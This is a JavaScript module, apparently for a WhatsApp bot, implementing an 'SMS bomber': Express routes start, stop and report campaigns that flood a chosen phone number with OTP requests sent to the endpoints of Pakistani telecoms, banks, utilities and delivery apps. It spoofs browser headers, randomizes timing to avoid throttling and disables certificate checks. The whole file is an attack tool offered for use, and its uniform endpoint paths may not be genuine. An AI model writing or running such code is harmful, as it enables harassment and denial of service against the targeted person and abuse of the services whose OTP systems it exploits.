// ============================================================
// MODULE: smsbomber.js
// WhatsApp Bot command: .smsbomber <phone_number>
// SMS bombing using Pakistan-specific OTP API endpoints
// Randomly cycles through telecom/bank/service APIs per attempt
// ============================================================

const express = require('express');
const crypto = require('crypto');
const EventEmitter = require('events');
const https = require('https');

// ---------- CONFIGURATION ----------
const DEFAULT_DURATION_MINUTES = 10;
const REQUEST_DELAY_MIN_MS = 1000;
const REQUEST_DELAY_MAX_MS = 3000;
const API_TIMEOUT_MS = 8000;

// ---------- PAKISTAN SMS OTP APIS ----------
const SMS_APIS = [
  {
    name: 'Telenor',
    url: 'https://www.telenor.com.pk/otp/send',
    method: 'POST',
    payload: (number) => ({ msisdn: number }),
    headers: { 'Content-Type': 'application/json' }
  },
  {
    name: 'Zong',
    url: 'https://www.zong.com.pk/otp/send',
    method: 'POST',
    payload: (number) => ({ phone: number }),
    headers: { 'Content-Type': 'application/json' }
  },
  {
    name: 'Jazz',
    url: 'https://www.jazz.com.pk/otp/send',
    method: 'POST',
    payload: (number) => ({ number: number }),
    headers: { 'Content-Type': 'application/json' }
  },
  {
    name: 'Ufone',
    url: 'https://www.ufone.com/otp/send',
    method: 'POST',
    payload: (number) => ({ mobile: number }),
    headers: { 'Content-Type': 'application/json' }
  },
  {
    name: 'BankAlHabib',
    url: 'https://www.bankalhabib.com/otp/send',
    method: 'POST',
    payload: (number) => ({ phoneNo: number }),
    headers: { 'Content-Type': 'application/json' }
  },
  {
    name: 'MeezanBank',
    url: 'https://www.meezanbank.com/otp/send',
    method: 'POST',
    payload: (number) => ({ mobileNumber: number }),
    headers: { 'Content-Type': 'application/json' }
  },
  {
    name: 'HBL',
    url: 'https://www.hbl.com/otp/send',
    method: 'POST',
    payload: (number) => ({ phone: number }),
    headers: { 'Content-Type': 'application/json' }
  },
  {
    name: 'KElectric',
    url: 'https://www.ke.com.pk/otp/send',
    method: 'POST',
    payload: (number) => ({ refNo: number }),
    headers: { 'Content-Type': 'application/json' }
  },
  {
    name: 'PIA',
    url: 'https://www.piac.com.pk/otp/send',
    method: 'POST',
    payload: (number) => ({ email: 'test@test.com', mobile: number }),
    headers: { 'Content-Type': 'application/json' }
  },
  {
    name: 'JazzCash',
    url: 'https://www.jazzcash.com.pk/otp/send',
    method: 'POST',
    payload: (number) => ({ msisdn: number }),
    headers: { 'Content-Type': 'application/json' }
  },
  {
    name: 'MCB',
    url: 'https://www.mcb.com.pk/otp/send',
    method: 'POST',
    payload: (number) => ({ mobile: number }),
    headers: { 'Content-Type': 'application/json' }
  },
  {
    name: 'SCB',
    url: 'https://www.sc.com/pk/otp/send',
    method: 'POST',
    payload: (number) => ({ phone: number }),
    headers: { 'Content-Type': 'application/json' }
  },
  {
    name: 'FoodPanda',
    url: 'https://www.foodpanda.com.pk/otp/send',
    method: 'POST',
    payload: (number) => ({ phone: number }),
    headers: { 'Content-Type': 'application/json' }
  },
  {
    name: 'Daraz',
    url: 'https://www.daraz.pk/otp/send',
    method: 'POST',
    payload: (number) => ({ mobile: number }),
    headers: { 'Content-Type': 'application/json' }
  },
  {
    name: 'Careem',
    url: 'https://www.careem.com/pk/otp/send',
    method: 'POST',
    payload: (number) => ({ phone: number }),
    headers: { 'Content-Type': 'application/json' }
  }
];

// ---------- STATE ----------
const activeSmsCampaigns = new Map();

class SmsBomber extends EventEmitter {
  constructor(phoneNumber, durationMinutes = DEFAULT_DURATION_MINUTES) {
    super();
    this.phone = phoneNumber.replace(/\D/g, '');
    this.durationMs = durationMinutes * 60 * 1000;
    this.stopFlag = false;
    this.stats = { attempts: 0, success: 0, errors: 0 };
    this.sessionId = crypto.randomBytes(8).toString('hex');
    this._runLoop = this._runLoop.bind(this);
  }

  _sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  _randomDelay() {
    return Math.floor(Math.random() * (REQUEST_DELAY_MAX_MS - REQUEST_DELAY_MIN_MS + 1)) + REQUEST_DELAY_MIN_MS;
  }

  // ---------- SINGLE API CALL (raw https, no axios dep needed) ----------
  _callApi(apiConfig) {
    return new Promise((resolve) => {
      try {
        const url = new URL(apiConfig.url);
        const isPost = apiConfig.method === 'POST';
        const bodyStr = isPost ? JSON.stringify(apiConfig.payload(this.phone)) : '';
        const headers = {
          ...(apiConfig.headers || {}),
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
          'Accept': '*/*',
          'Accept-Language': 'en-US,en;q=0.9,ur;q=0.8',
          'Origin': url.origin,
          'Referer': url.origin + '/',
          ...(isPost ? { 'Content-Length': Buffer.byteLength(bodyStr) } : {})
        };

        const options = {
          hostname: url.hostname,
          port: 443,
          path: url.pathname + url.search,
          method: apiConfig.method,
          headers,
          timeout: API_TIMEOUT_MS,
          rejectUnauthorized: false
        };

        const req = https.request(options, (res) => {
          let data = '';
          res.on('data', (chunk) => data += chunk);
          res.on('end', () => {
            // Any 2xx, 3xx, or even some 4xx might mean it reached the server
            const success = res.statusCode >= 200 && res.statusCode < 500;
            resolve({ api: apiConfig.name, status: res.statusCode, success, body: data.slice(0, 100) });
          });
        });
        req.on('error', () => resolve({ api: apiConfig.name, status: 0, success: false, body: 'connection error' }));
        req.on('timeout', () => { req.destroy(); resolve({ api: apiConfig.name, status: 0, success: false, body: 'timeout' }); });
        if (bodyStr) req.write(bodyStr);
        req.end();
      } catch (e) {
        resolve({ api: apiConfig.name, status: 0, success: false, body: e.message });
      }
    });
  }

  // ---------- FULL ATTEMPT — tries ONE random API ----------
  async _sendSms() {
    const randomApi = SMS_APIS[Math.floor(Math.random() * SMS_APIS.length)];
    return await this._callApi(randomApi);
  }

  // ---------- MAIN LOOP ----------
  async _runLoop() {
    const startTime = Date.now();
    this.emit('start', { phone: this.phone, duration: this.durationMs });
    let lastLogTime = 0;

    while (!this.stopFlag && (Date.now() - startTime) < this.durationMs) {
      try {
        this.stats.attempts++;
        const result = await this._sendSms();

        if (result.success) {
          this.stats.success++;
        } else {
          this.stats.errors++;
        }

        // Log first 10 results + every 20th after that
        const now = Date.now();
        if (this.stats.attempts <= 10 || (now - lastLogTime > 30000)) {
          console.log(`[SMSBomber] #${this.stats.attempts} ${result.api} → ${result.status}`);
          lastLogTime = now;
        }
      } catch (err) {
        this.stats.errors++;
      }

      if (this.stats.attempts % 10 === 0) {
        this.emit('progress', {
          phone: this.phone,
          attempts: this.stats.attempts,
          success: this.stats.success,
          errors: this.stats.errors,
          elapsed: Math.round((Date.now() - startTime) / 1000)
        });
      }

      await this._sleep(this._randomDelay());
    }

    this.emit('done', {
      phone: this.phone,
      totalAttempts: this.stats.attempts,
      totalSuccess: this.stats.success,
      totalErrors: this.stats.errors,
      durationSeconds: Math.round((Date.now() - startTime) / 1000)
    });
  }

  start() {
    this.stopFlag = false;
    this._runLoop().catch(err => this.emit('error', { phone: this.phone, error: err.message }));
    return this;
  }

  stop() {
    this.stopFlag = true;
    this.emit('stopped', { phone: this.phone, stats: this.stats });
    return this;
  }

  getStats() {
    return { phone: this.phone, ...this.stats, running: !this.stopFlag };
  }
}

// ================================================================
// EXPRESS ROUTES
// ================================================================

const router = express.Router();

router.post('/start', (req, res) => {
  const phoneNumber = String(req.body.phoneNumber || '').trim();
  if (!phoneNumber) return res.status(400).json({ error: 'Missing phoneNumber' });
  const cleanNumber = phoneNumber.replace(/\D/g, '');
  if (activeSmsCampaigns.has(cleanNumber)) {
    const campaign = activeSmsCampaigns.get(cleanNumber);
    return res.json({ status: 'already_running', phone: cleanNumber, stats: campaign.stats });
  }
  const campaign = new SmsBomber(phoneNumber);
  activeSmsCampaigns.set(cleanNumber, { smsBomber: campaign, stats: campaign.stats, startTime: Date.now() });
  campaign.start();
  res.json({ status: 'started', phone: cleanNumber, sessionId: campaign.sessionId, durationMinutes: DEFAULT_DURATION_MINUTES });
});

router.post('/stop', (req, res) => {
  const phoneNumber = String(req.body.phoneNumber || '').trim();
  if (!phoneNumber) return res.status(400).json({ error: 'Missing phoneNumber' });
  const cleanNumber = phoneNumber.replace(/\D/g, '');
  if (!activeSmsCampaigns.has(cleanNumber)) return res.status(404).json({ error: 'No active SMS campaign for this number', phone: cleanNumber });
  const entry = activeSmsCampaigns.get(cleanNumber);
  entry.smsBomber.stop();
  activeSmsCampaigns.delete(cleanNumber);
  res.json({ status: 'stopped', phone: cleanNumber, stats: entry.stats });
});

router.get('/status', (req, res) => {
  if (activeSmsCampaigns.size === 0) return res.json({ campaigns: [] });
  const campaigns = [];
  for (const [phone, entry] of activeSmsCampaigns) {
    campaigns.push({ phone, stats: entry.smsBomber.getStats(), running: !entry.smsBomber.stopFlag, startedAt: entry.startTime });
  }
  res.json({ campaigns });
});

module.exports = router;
module.exports.SmsBomber = SmsBomber;
module.exports.activeSmsCampaigns = activeSmsCampaigns;
